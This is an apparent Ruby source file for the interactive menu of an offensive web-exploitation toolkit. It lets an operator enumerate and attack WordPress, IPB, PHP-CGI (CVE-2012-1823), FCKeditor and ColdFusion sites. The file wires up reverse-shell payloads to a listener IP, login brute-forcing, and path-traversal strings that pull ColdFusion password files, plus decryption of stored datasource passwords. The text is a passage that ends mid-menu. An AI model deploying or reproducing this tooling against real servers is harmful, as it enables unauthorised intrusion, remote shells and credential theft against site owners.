# Specialty Tools User Interface Menu
# This is for specific checks and/or exploits
# i.e. 0days and one-offs you build and add in


# Specialty Tools Help Menu
def special_usage
  puts "Available Options for Specialty Tools Menu: ".underline.white
  puts "back ".light_yellow + "      => ".white + "Return to Main Menu".light_red
  puts "coldfusion".light_yellow + " => ".white + "Coldfusion Tools".light_red
  puts "moinmoin".light_yellow + "   => ".white + "MoinMoin RCE".light_red
  puts "phpcgi".light_yellow + "     => ".white + "PHP CGI RCE Tools".light_red
  puts "phpBB".light_yellow + "      => ".white + "phpBB Tools".light_red
  puts "ipb".light_yellow + "        => ".white + "IPB Tools".light_red
#  puts "joomla".light_yellow + "     => ".white + "Joomla! Tools".light_red
#  puts "myBB".light_yellow + "       => ".white + "MyBB Tools".light_red
#  puts "vBulletin".light_yellow + "  => ".white + "vBulletin Tools".light_red
  puts "wp".light_yellow + "         => ".white + "WordPress Tools".light_red
  puts "fckeditor".light_yellow + "  => ".white + "FCKEditor Tools".light_red
  print_line("")
end

# Specialty Tools Menu
def special_menu
  puts
  prompt = "(sp3cial)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      special_menu
    when /^h$|^help$|^ls$/i
      puts
      special_usage
      special_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to Main Menu....")
      main_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      special_menu
    when /^local$|^OS$/i
      local_shell
      special_menu
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      special_menu
    when /^ip$/i
      ip_info
      special_menu
    when /^ip2host$|^host2ip$|^resolv/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      special_menu
    when /^coldfusion$|^cf$/i
      coldfusion_menu
      special_menu
    when /^phpBB$/i
      phpBB_menu
      special_menu
    when /^phpCGI$/i
      phpCGI_menu
      special_menu
    when /^wp$|^wordpress$|^word.press$/i
      wp_menu
      special_menu
    when /^fckeditor$|^fck$/i
      fckeditor_menu
      special_menu
    when /^ipb$|Invision PowerBoard|^i.p.b.$/i
      ipb_menu
      special_menu
    when /^moinmoin$|^moin$|^moin.moin/i
      moinmoin_menu
      special_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      special_menu
    end
  end
end

# WordPress Help Menu
def wp_usage
  puts "Available Options for WordPress Menu: ".underline.white
  puts "back ".light_yellow + "      => ".white + "Return to Main Menu".light_red
  puts "version".light_yellow + "    => ".white + "WordPress Version Checker".light_red
  puts "users".light_yellow + "      => ".white + "WordPress Users Enumerator".light_red
  puts "themes".light_yellow + "     => ".white + "WordPress Themes Enumerator".light_red
  puts "plugins".light_yellow + "    => ".white + "WordPress Plugins Enumerator".light_red
  puts "fthemes".light_yellow + "    => ".white + "WordPress Forceful Themes Enumerator".light_red
  puts "fplugins".light_yellow + "   => ".white + "WordPress Forceful Plugins Enumerator".light_red
  puts "backups".light_yellow + "    => ".white + "WordPress Backup Config Enumerator".light_red
  puts "enumerator".light_yellow + " => ".white + "WordPress Enumerator Tool (Runs Everything)".light_red
  puts "cred_check".light_yellow + " => ".white + "WordPress Login Credentials Checker".light_red
  puts "wp_login".light_yellow + "   => ".white + "WordPress Login Bruteforcer".light_red
end

# IPB Forums
def wp_menu
  puts
  prompt = "(WordPr3ss)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      wp_menu
    when /^h$|^help$|^ls$/i
      puts
      wp_usage
      wp_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to previous menu....")
      special_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      wp_menu
    when /^local$|^OS$/i
      local_shell
      wp_menu
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      wp_menu
    when /^ip$/i
      ip_info
      wp_menu
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      wp_menu
    when /^version$|^v$/i
      target = Readline.readline("   Enter Target URL: ", true)
      puts
      print_status("Checking for WordPress version info....")
      wp = WordPressAudit.new(target.strip.chomp)
      a = wp.wp_generator_version_check
      b = wp.wp_install_version_check
      c = wp.wp_readme_version_check
      d = wp.wp_rss_version_check
      if a.nil? and b.nil? and c.nil? and d.nil?
        print_error("Unable to determine WordPress version for #{target.strip.chomp}.....")
      end
      wp_menu
    when /^plugin/i
      target = Readline.readline("   Enter Target URL: ", true)
      puts
      print_status("Trying to Enumerate WordPress Plugins....")
      wp = WordPressAudit.new(target.strip.chomp)
      plugins = wp.wp_plugin_enumerator
      if plugins.nil?
        print_error("Sorry, Unable to identify any known WordPress plugins.....")
      end
      wp_menu
    when /^fplugin/i
      target = Readline.readline("   Enter Target URL: ", true)
      answer = Readline.readline("   Use default plugins fuzz file (Y/N)?", true)
      if answer[0].upcase == 'N'
        custom=true
        while(true)
          plist = Readline.readline("   Plugins Fuzz File to Use: ", true)
          break if File.exists?(plist.strip.chomp)
          print_error("Problem loading #{plist.strip.chomp}!")
          print_error("Check path or permissions and try again....\n\n")
        end
      end
      puts
      print_status("Trying Forceful Enumeration of WordPress Plugins....")
      wp = WordPressAudit.new(target.strip.chomp)
      plugins = wp.wp_plugin_forceful_enumerator if not custom
      plugins = wp.wp_plugin_forceful_enumerator(plist.strip.chomp) if custom
      if plugins.nil?
        print_error("Unable to identify any known WordPress plugins.....")
      end
      wp_menu
    when /^theme/i
      target = Readline.readline("   Enter Target URL: ", true)
      puts
      print_status("Trying to Enumerate WordPress Themes....")
      wp = WordPressAudit.new(target.strip.chomp)
      plugins = wp.wp_theme_enumerator
      if plugins.nil?
        print_error("Unable to enumerate WordPress themes.....")
      end
      wp_menu
    when /^ftheme/i
      target = Readline.readline("   Enter Target URL: ", true)
      answer = Readline.readline("   Use default themes fuzz file (Y/N)?", true)
      if answer[0].upcase == 'N'
        custom=true
        while(true)
          tlist = Readline.readline("   Themes Fuzz File to Use: ", true)
          break if File.exists?(tlist.strip.chomp)
          print_error("Problem loading #{tlist.strip.chomp}!")
          print_error("Check path or permissions and try again....\n\n")
        end
      end
      puts
      print_status("Trying Forceful Enumeration of WordPress Themes....")
      wp = WordPressAudit.new(target.strip.chomp)
      themes = wp.wp_theme_forceful_enumerator if not custom
      themes = wp.wp_theme_forceful_enumerator(tlist.strip.chomp) if custom
      if themes.nil?
        print_error("Unable to identify any known WordPress themes.....")
      end
      wp_menu
    when /^user/i
      target = Readline.readline("   Enter Target URL: ", true)
      puts
      print_status("Checking for WordPress usernames....")
      wp = WordPressAudit.new(target.strip.chomp)
      users = wp.wp_users_check
      if users.nil?
        print_error("No Users Found!")
      end
      wp_menu
    when /^backups/i
      target = Readline.readline("   Enter Target URL: ", true)
      puts
      print_status("Checking for common config backups....")
      wp = WordPressAudit.new(target.strip.chomp)
      wp.wp_backup_configs_check
      wp_menu
    when /^enum$|^enumerat/i
      target = Readline.readline("   Enter Target URL: ", true)
      puts
      print_status("Running WordPress Enumeration....")
      wp = WordPressAudit.new(target.strip.chomp)
      a = wp.wp_generator_version_check
      b = wp.wp_install_version_check
      c = wp.wp_readme_version_check
      if a.nil? and b.nil? and c.nil?
        print_error("Unable to determine WordPress version for #{target.strip.chomp}.....")
      end
      fpd_path = wp.wp_rss_fpd
      print_good("Full Path Disclosure: #{target.strip.chomp.sub(/\/$/, '')}/rss-functions.php") unless fpd_path.nil?
      print_line("   #{fpd_path}") unless fpd_path.nil?
      print_error("/rss-functions.php FPD Not Found...") if fpd_path.nil?
      wp.wp_xmlrpc_check
      puts
      print_status("Trying to Enumerate Plugins....")
      plugins = wp.wp_plugin_enumerator
      if plugins.nil?
        print_error("Plugin Directory is not Indexed")
        print_status("Going to try forceful enumeration...")
        plugins = wp.wp_plugin_forceful_enumerator
        if plugins.nil?
          print_error("Unable to identify any known WordPress plugins!")
        end
      end
      puts
      print_status("Trying to Enumerate Themes....")
      themes = wp.wp_theme_enumerator
      if themes.nil?
        print_error("Themes Directory is not Indexed")
        themes = wp.wp_theme_forceful_enumerator
        print_error("Unable to identify WordPress theme!") if themes.nil?
      end
      puts
      print_status("Checking for config backups....")
      wp.wp_backup_configs_check
      puts
      print_status("Checking for WordPress usernames....")
      users = wp.wp_users_check
      if users.nil?
        print_error("No Users Found!")
      end
      wp_menu
    when /^cred.check|^credential|^creds$|^credz$/i
      target = Readline.readline("   Enter Target URL: ", true)
      answer = Readline.readline("   Use default path (Y/N)?", true)
      if answer[0].upcase == 'N'
        while(true)
          response = Readline.readline("   Path to WP Login Page: ", true)
          path = response.strip.chomp
        end
      else
        path=nil
      end
      username = Readline.readline("   Enter WP Username: ", true)
      password = Readline.readline("   Enter #{username.strip.chomp}'s Password: ", true)
      puts
      print_status("Checking credentials....")
      wp = WordPressAudit.new(target.strip.chomp)
      wp.wp_login_check(username.strip.chomp, password.strip.chomp, path)
      wp_menu
    when /^wp.login|^login$|^brute|^wp.brute/i
      target = Readline.readline("   Enter Target URL: ", true)
      answer = Readline.readline("   Use default path (Y/N)?", true)
      if answer[0].upcase == 'N'
        while(true)
          response = Readline.readline("   Path to WP Login Page: ", true)
          path = response.strip.chomp
        end
      else
        path=nil
      end
      username = Readline.readline("   Enter WP Username: ", true)
      while(true)
        wordlist = Readline.readline("   Path to Wordlist: ", true)
        break if File.exists?(wordlist.strip.chomp)
        print_error("Problem loading #{wordlist.strip.chomp}!")
        print_error("Check path or permissions and try again....\n\n")
      end
      puts
      wp = WordPressAudit.new(target.strip.chomp)
      wp.wp_login_bruter2(username.strip.chomp, wordlist.strip.chomp, path)
      wp_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      wp_menu
    end
  end
end

# IPB Forum Help Menu
def ipb_usage
  puts "Available Options for I.P.B. Menu: ".underline.white
  puts "back ".light_yellow + "     => ".white + "Return to Main Menu".light_red
  puts "check".light_yellow + "     => ".white + "IPB <= 3.3.4 Unserialized RCE Check".light_red
  puts "exploit".light_yellow + "   => ".white + "IPB <= 3.3.4 Unserialized RCE Exploit".light_red
end

# IPB Forums
def ipb_menu
  puts
  prompt = "(ipb)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      ipb_menu
    when /^h$|^help$|^ls$/i
      puts
      ipb_usage
      ipb_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to previous menu....")
      special_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      ipb_menu
    when /^local$|^OS$/i
      local_shell
      ipb_menu
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      ipb_menu
    when /^ip$/i
      ip_info
      ipb_menu
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      ipb_menu
    when /^check$/i
      site = Readline.readline("   Enter URL to IPB Forum: ", true)
      puts
      if ipb_unserialized_rce_check(site.sub(/\/$/, ''))
        print_good("Site is vulnerable!\n")
      end
      ipb_menu
    when /^exploit$/i
      site = Readline.readline("   Enter URL to IPB Forum: ", true)
      if ipb_unserialized_rce_check(site.sub(/\/$/, ''))
        print_good("Site is vulnerable!\n\n")
        ipb_unserialized_rce_shell(site.sub(/\/$/, ''))
        # Fuck with this later and add in more payload options.....
      end
      ipb_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      ipb_menu
    end
  end
end

# PHP CGI Help Menu
def phpCGI_usage
  puts "Available Options for php-cgi Menu: ".underline.white
  puts "back ".light_yellow + "     => ".white + "Return to Main Menu".light_red
  puts "check".light_yellow + "     => ".white + "PHP CGI RCE Checker (CVE-2012-1823)".light_red
  puts "exploit".light_yellow + "   => ".white + "PHP CGI RCE Exploiter (CVE-2012-1823)".light_red
  puts "lolapache".light_yellow + " => ".white + "Apache scriptAlias PHP CGI RCE Checker & Exploiter".light_red
end

# PHP CGI Menu
def phpCGI_menu
  puts
  prompt = "(phpCGI)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      phpCGI_menu
    when /^h$|^help$|^ls$/i
      puts
      phpCGI_usage
      phpCGI_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to previous menu....")
      special_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      phpCGI_menu
    when /^local$|^OS$/i
      local_shell
      phpCGI_menu
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      phpCGI_menu
    when /^ip$/i
      ip_info
      phpCGI_menu
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      phpCGI_menu
    when /^check$/i
      s = Readline.readline("   Enter Target URL: ", true)
      target=s.strip.chomp.sub(/\/$/, '')
      puts
      print_status("Checking for PHP-CGI RCE or CVE-2012-1823....")
      link = normal_php_cgi_rce_check(target)
      if link.nil?
        print_error("Site does NOT appear to be vulnerable!")
      else
        print_good("Site is vulnerable!")
      end
      puts
      phpCGI_menu
    when /^exploit$/i
      s = Readline.readline("   Enter Target URL: ", true)
      target=s.strip.chomp.sub(/\/$/, '')
      puts
      print_status("Checking for PHP-CGI RCE or CVE-2012-1823....")
      link = normal_php_cgi_rce_check(target)
      if link.nil?
        print_error("Site does NOT appear to be vulnerable!")
      else
        while(true)
          print_good("Site is vulnerable!")
          print_caution("Available Payload Options: ")
          print_caution("0) Pseudo Command Shell")
          print_caution("1) Ruby Reverse Shell Oneliner")
          print_caution("2) Perl Reverse Shell Oneliner")
          print_caution("3) Python Reverse Shell Oneliner")
          print_caution("4) PHP Reverse Shell Oneliner")
          print_caution("5) PHP File Upload Oneliner")
          puts
          a = Readline.readline("   Enter Payload Option: ", true)
          if a.strip.chomp.to_i >= 0 and a.strip.chomp.to_i <= 5
            if a.strip.chomp.to_i > 0 and a.strip.chomp.to_i < 5
              ip = Readline.readline("   Enter Listener IP: ", true)
              port = Readline.readline("   Enter Listener PORT: ", true)
            end
            puts
            evil = Payloads.new()
            case a.strip.chomp.to_i
            when 0
              normal_php_cgi_rce_exploit_shell(link)
            when 1
              payload = evil.ruby_reverse_oneliner(ip.strip.chomp, port.strip.chomp.to_i)
            when 2
              payload = evil.perl_reverse_oneliner(ip.strip.chomp, port.strip.chomp.to_i)
            when 3
              payload = evil.python_reverse_oneliner(ip.strip.chomp, port.strip.chomp.to_i)
            when 4
              payload = evil.php_reverse_oneliner(ip.strip.chomp, port.strip.chomp.to_i)
            when 5
              localfile = Readline.readline("   Local File to Use: ", true)
              remotefile = Readline.readline("   Remote File w/Path to Write: ", true)
              puts
              if File.exists?(localfile.strip.chomp)
                print_status("Trying to upload local file to target....")
                payload = evil.php_upload_oneliner(localfile.strip.chomp, remotefile.strip.chomp)
              else
                print_error("Unable to locate local file!")
                print_error("Check path or permissions and try again....\n\n")
              end
            end
            break
          else
            puts
            print_error("Oops, Invalid Option Selected!")
            print_error("Please choose valid option from menu below....\n\n")
          end
        end
        if not payload.nil?
          print_status("Trying to trigger reverse shell....")
          print_status("Make sure your listener is ready to receive shell....")
          sleep(3)
          if normal_php_cgi_rce_exploit_cmd(link, payload.inspect.gsub("$", "\\$"))
            print_good("Commands run successfully!")
            print_good("Hopefully you enjoyed your shell session ;)")
          else
            puts
            print_caution("Possible Error encountered trying to run commands!")
            print_caution("Confirm things manually to be sure....\n\n")
          end
        end
      end
      phpCGI_menu
    when /^lolapache$|^lol$|^apache$|/i
      s = Readline.readline("   Enter Target URL: ", true)
      target=s.strip.chomp.sub(/\/$/, '')
      puts
      print_status("Checking for Apache scriptAlias PHP-CGI RCE....")
      path = apache_script_alias_rce_check(target)
      if path.nil?
        print_error("Site does NOT appear to be vulnerable!")
      else
        while(true)
          print_good("Site is vulnerable!")
          print_caution("Available Options: ")
          print_caution("x) Abort & Return to Menu")
          print_caution("0) Drop to Pseudo Command Shell")
          print_caution("1) Ruby Reverse Shell Oneliner")
          print_caution("2) Perl Reverse Shell Oneliner")
          print_caution("3) Python Reverse Shell Oneliner")
          print_caution("4) PHP Reverse Shell Oneliner")
          print_caution("5) PHP File Upload Oneliner")
          puts
          a = Readline.readline("   Enter Option: ", true)
          if a.strip.chomp.to_i >= 0 and a.strip.chomp.to_i <= 5
            if a.strip.chomp.to_i > 0 and a.strip.chomp.to_i < 5
              ip = Readline.readline("   Enter Listener IP: ", true)
              port = Readline.readline("   Enter Listener PORT: ", true)
            end
            puts
            evil = Payloads.new()
            case a.strip.chomp.to_i
            when 0
              apache_script_alias_rce_exploit_shell("#{target}#{path}")
            when 1
              payload = evil.ruby_reverse_oneliner(ip.strip.chomp, port.strip.chomp.to_i)
            when 2
              payload = evil.perl_reverse_oneliner(ip.strip.chomp, port.strip.chomp.to_i)
            when 3
              payload = evil.python_reverse_oneliner(ip.strip.chomp, port.strip.chomp.to_i)
            when 4
              payload = evil.php_reverse_oneliner(ip.strip.chomp, port.strip.chomp.to_i)
            when 5
              localfile = Readline.readline("   Local File to Use: ", true)
              remotefile = Readline.readline("   Remote File w/Path to Write: ", true)
              puts
              if File.exists?(localfile.strip.chomp)
                print_status("Trying to upload local file to target....")
                payload = evil.php_upload_oneliner(localfile.strip.chomp, remotefile.strip.chomp)
              else
                print_error("Unable to locate local file!")
                print_error("Check path or permissions and try again....\n\n")
              end
            end
            break
          else
            puts
            print_error("Oops, Invalid Option Selected!")
            print_error("Please choose valid option from menu below....\n\n")
          end
        end
        if not payload.nil?
          print_status("Trying to trigger reverse shell....")
          print_status("Make sure your listener is ready to receive shell....")
          sleep(3)
          if apache_script_alias_rce_exploit_cmd("#{target}#{path}", payload.inspect.gsub("$", "\\$"))
            print_good("Commands run successfully!")
            print_good("Hopefully you enjoyed your shell session ;)")
          else
            puts
            print_caution("Possible Error encountered trying to run commands!")
            print_caution("Confirm things manually to be sure....\n\n")
          end
        else
          print_status("OK, returning to previous menn....")
        end
      end
      puts
      phpCGI_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      phpCGI_menu
    end
  end
end

# phpBB Help Menu
def phpBB_usage
  puts "Available Options for phpBB Menu: ".underline.white
  puts "back ".light_yellow + "   => ".white + "Return to Main Menu".light_red
  puts "version".light_yellow + " => ".white + "phpBB Version Checker".light_red
end

# phpBB Menu
def phpBB_menu
  puts
  prompt = "(phpBB)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      phpBB_menu
    when /^h$|^help$|^ls$/i
      puts
      phpBB_usage
      phpBB_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to previous menu....")
      special_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      phpBB_menu
    when /^local$|^OS$/i
      local_shell
      phpBB_menu
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      phpBB_menu
    when /^ip$/i
      ip_info
      phpBB_menu
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      phpBB_menu
    when /^version$|^vers$|^v$/i
      s = Readline.readline("   Enter Target URL: ", true)
      target=s.strip.chomp.sub(/\/$/, '')
      index = '/index.php'
      http=EasyCurb.new
      puts
      res = http.get(target + index)
      phpbb = PHPBBChecks.new(target)
      if phpbb.body_check(res[0])
        print_good("Confirmed phpBB is running!")
        if res[0] =~ /phpBB<\/a> version (\d\.\d?.?.) /
          puts "   [".light_green + "+".white + "] ".light_green + "Version: #{$1.to_s}".white
        end
      end
      print_status("Trying to find phpBB version info....")
      print_status("Checking default theme....")
      ver = phpbb.theme_config_version_finder
      if not ver.nil?
        print_good("Found default theme config!")
        puts "   [".light_green + "+".white + "] ".light_green + ver.to_s.white
      else
        print_error("No luck finding default theme....")
      end
      print_status("Running changelogs MD5 check....")
      vers_hash = phpbb.changelog_checksum_version_finder
      if not vers_hash.nil? and vers_hash.size > 0
        ver = vers_hash
        print_good("Found Changelog File!")
        puts "   [".light_green + "+".white + "] ".light_green + ver.to_s.white
      else
        print_error("No luck finding cahngelog files....")
      end
      phpBB_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      phpBB_menu
    end
  end
end


# FCKeditor Help Menu
def fckeditor_usage
  puts "Available Options for FCKeditor Menu: ".underline.white
  puts "back ".light_yellow + "     => ".white + "Return to Main Menu".light_red
  puts "version".light_yellow + "   => ".white + "FCKeditor Version Check".light_red
  puts "uploaders".light_yellow + " => ".white + "FCKeditor Uploader Check".light_red
end

# FCKeditor Menu
def fckeditor_menu
  puts
  prompt = "(FCKeditor)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      fckeditor_menu
    when /^h$|^help$|^ls$/i
      puts
      fckeditor_usage
      fckeditor_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to previous menu....")
      special_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      fckeditor_menu
    when /^local$|^OS$/i
      local_shell
      fckeditor_menu
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      fckeditor_menu
    when /^ip$/i
      ip_info
      fckeditor_menu
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      fckeditor_menu
    when /^version$|^vers$|^v$/i
      s = Readline.readline("   Enter Target URL: ", true)
      target=s.strip.chomp.sub(/\/$/, '')
      puts
      fck = FCKEditor.new(target)
      fck.version_check(target, true)
      fckeditor_menu
    when /^finder$|^uploaders$|^find$/i
      s = Readline.readline("   Enter Target URL: ", true)
      target=s.strip.chomp.sub(/\/$/, '')
      puts
      fck = FCKEditor.new(target)
      fck.uploader_file_check(target, true, false)
      fckeditor_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      fckeditor_menu
    end
  end
end


# CF Help Menu
def coldfusion_usage
  puts "Available Options for Coldfusion Menu: ".underline.white
  puts "back ".light_yellow + "      => ".white + "Return to Specialty Menu".light_red
  puts "scan".light_yellow + "       => ".white + "Scan for Common Files".light_red
  puts "version".light_yellow + "    => ".white + "Coldfusion Version Scan".light_red
  puts "lfi".light_yellow + "        => ".white + "Locale or Subzero LFI Exploits (v6-10)".light_red
  puts "rds_bypass".light_yellow + " => ".white + "RDS Auth Bypass (v9-10)".light_red
  puts "fckeditor".light_yellow + "  => ".white + "Exploit FCKEditor Uploader (v8)".light_red
  puts "xee".light_yellow + "        => ".white + "XML External Entity LFI Exploit (all)".light_red
  puts "auto".light_yellow + "       => ".white + "Version Check & Attempts Matching Exploits".light_red
  puts "decrypt".light_yellow + "    => ".white + "Decrypt CF Neo Database Credentials (v7-9)".light_red
  print_line("")
end

# CF Menu
def coldfusion_menu(target=nil)
  if target.nil?
    s = Readline.readline("   Enter Target URL: ", true)
    target=s.strip.chomp
    puts
  end
  @target=target # Ask once and be done...
  puts
  prompt = "(ColdFusion)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      coldfusion_menu(@target)
    when /^h$|^help$|^ls$/i
      puts
      coldfusion_usage
      coldfusion_menu(@target)
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to previous menu....")
      special_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      coldfusion_menu(@target)
    when /^local$|^OS$/i
      local_shell
      coldfusion_menu(@target)
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      coldfusion_menu(@target)
    when /^ip$/i
      ip_info
      coldfusion_menu(@target)
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      coldfusion_menu(@target)
    when /^decrypt/i
      cf = Coldfusion.new('foo')
      encrypted = Readline.readline("   Enter Encrypted String: ", true)
      decrypted = cf.neo_decrypt(encrypted.strip.chomp)
      print_status("Decrypting Coldfusion DataSource Password....")
      print_status("Encrypted Pass: #{encrypted.strip.chomp}")
      print_good("Decrypted Pass: #{decrypted}\n")
      coldfusion_menu(@target)
    when /^scan$|^common$|^files$/i
      cf = Coldfusion.new(@target)
      cf.cf_file_scan(@target)
      coldfusion_menu(@target)
    when /^version$|^base$|^check$/i
      print_line("")
      cf = Coldfusion.new(@target)
      cf.ent_vs_std
      coldfusion_version = cf.md5_version_check
      if coldfusion_version.nil?
        coldfusion_version = cf.planb_version_check
        if coldfusion_version.nil?
          coldfusion_version = cf.wsdl_version_check
          if coldfusion_version.nil?
            coldfusion_version = cf.rds_version_check
            if coldfusion_version.nil?
              puts
              print_error("Epic Fail - Unable to Determine Version Info!")
              print_error("Check URL provided or follow up manually to be sure....\n\n")
            end
          end
        end
      end
      coldfusion_menu(@target)
    when /^lfi$|^old.lfi$|^locale$/i
      coldfusion_version = Readline.readline("   Enter CF Version: ", true)
      puts
      case coldfusion_version.strip.chomp.to_i
      when 6
        cf = Coldfusion.new(@target)
        print_status("Trying to trigger LFI via 'locale' parameter......")
        if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en')
          if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en')
            print_error("Locale LFI doesn't seem to be working! :(")
            print_error("Check version and URL path and retry or try checking alternative entry points manually....\n\n")
          end
        end
      when 7
        cf = Coldfusion.new(@target)
        print_status("Trying to trigger LFI via 'locale' parameter......")
        if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en')
          if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\opt\coldfusionmx7\lib\password.properties%00en')
            if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en')
              print_error("Locale LFI doesn't seem to be working! :(")
              print_error("Check version and URL path and retry or try checking alternative entry points manually....\n\n")
            end
          end
        end
      when 8
        cf = Coldfusion.new(@target)
        print_status("Trying to trigger LFI via 'locale' parameter......")
        if not old_lfi('locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en')
          if not old_lfi('locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en')
            print_error("Locale LFI doesn't seem to be working! :(")
            print_error("Check version and URL path and retry or try checking alternative entry points manually....\n\n")
          end
        end
      when 9
        cf = Coldfusion.new(@target)
        print_status("Trying to trigger l10n parsing LFI......")
        o = cf.ent_vs_std
        if o[0] = 'Linux'
          os=2
        elsif o[0] = 'Windows'
          os=1
        else
          os=0
        end
        os = cf.os_lion_check if os.to_i == 0
        if os.to_i == 1
          if not cf.subzero('..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties')
            if not cf.subzero('..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties')
              if not cf.subzero('..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties')
                print_error("l10n parsing LFI doesn't seem to be working! :(")
                print_error("Check version and URL path and retry or try checking manually....\n\n")
              end
            end
          end
        else
          if not cf.subzero('../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties')
            if not cf.subzero('../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties')
              print_error("l10n parsing LFI doesn't seem to be working! :(")
              print_error("Check version and URL path and retry or try checking manually....\n\n")
            end
          end
        end
      else
        puts
        print_error("Target Version NOT Supported by this Attack!\n\n")
      end
      coldfusion_menu(@target)
    when /^subzero$|^sub$|^sub.zero$/i
